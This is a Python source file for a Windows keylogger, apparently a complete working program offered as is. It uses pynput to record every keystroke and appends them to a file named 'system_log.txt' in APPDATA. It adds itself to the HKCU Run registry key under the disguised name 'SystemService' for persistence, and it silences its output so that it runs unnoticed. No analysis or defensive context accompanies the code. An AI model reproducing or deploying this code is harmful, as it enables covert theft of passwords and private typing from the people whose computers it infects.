import os
import sys
import time
from pynput import keyboard
import winreg

# Configuration
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'system_log.txt')

class SimpleKeyLogger:
    def __init__(self):
        self.setup_autostart()
        self.log = ""
        
    def setup_autostart(self):
        """Add to Windows startup"""
        try:
            app_path = os.path.abspath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, app_path)
        except:
            pass

    def on_press(self, key):
        """Record key presses"""
        try:
            # Handle special keys
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.esc: '[ESC]'
            }
            
            self.log += special_keys.get(key, str(key).replace("'", ""))
            
            # Save to file every 10 characters
            if len(self.log) >= 10:
                with open(LOG_FILE, 'a') as f:
                    f.write(self.log)
                self.log = ""
                
        except:
            pass

    def start(self):
        """Begin keylogging"""
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    # Hide window
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    sys.stdin = open(os.devnull, 'r')
    
    logger = SimpleKeyLogger()
    logger.start()